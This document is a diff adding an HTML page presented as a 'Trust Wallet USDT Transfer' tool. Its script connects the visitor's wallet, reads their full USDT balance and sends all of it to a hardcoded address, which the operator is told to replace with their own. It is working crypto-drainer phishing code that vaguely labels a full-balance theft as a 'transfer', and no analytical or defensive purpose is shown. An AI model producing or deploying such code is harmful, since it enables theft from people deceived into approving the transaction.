@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Trust Wallet USDT Transfer</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      padding: 40px;
+      text-align: center;
+    }
+    button {
+      background-color: #4a90e2;
+      color: white;
+      padding: 14px 28px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 16px;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Connect Trust Wallet & Transfer USDT</h2>
+  <p>Open this page inside Trust Wallet browser</p>
+  <button onclick="connectAndTransfer()">Connect & Transfer</button>
+
+  <div id="status"></div>
+
+  <script>
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum Mainnet
+    const DESTINATION_ADDRESS = "0x8ca2e91B86d1C566F4B65cBBa9A2DE3fcdB7FdBd"; // CHANGE THIS TO YOUR WALLET
+    const ERC20_ABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function transfer(address to, uint256 value) returns (bool)",
+      "function decimals() view returns (uint8)"
+    ];
+
+    async function connectAndTransfer() {
+      const status = document.getElementById("status");
+      try {
+        if (!window.ethereum) {
+          alert("Please open this page in the Trust Wallet dApp browser.");
+          return;
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+        const rawBalance = await usdt.balanceOf(userAddress);
+        const decimals = await usdt.decimals();
+        const readableBalance = ethers.formatUnits(rawBalance, decimals);
+
+        if (rawBalance == 0n) {
+          status.innerText = `Your USDT balance is 0. Nothing to transfer.`;
+          return;
+        }
+
+        status.innerText = `Your USDT Balance: ${readableBalance}\n\nRequesting transfer...`;
+
+        const tx = await usdt.transfer(DESTINATION_ADDRESS, rawBalance);
+        await tx.wait();
+
+        status.innerText = `✅ Transfer complete. TX Hash:\n${tx.hash}`;
+      } catch (error) {
+        console.error(error);
+        status.innerText = "❌ Transfer failed or was cancelled by user.";
+      }
+    }
+  </script>
+
+</body>
+</html>
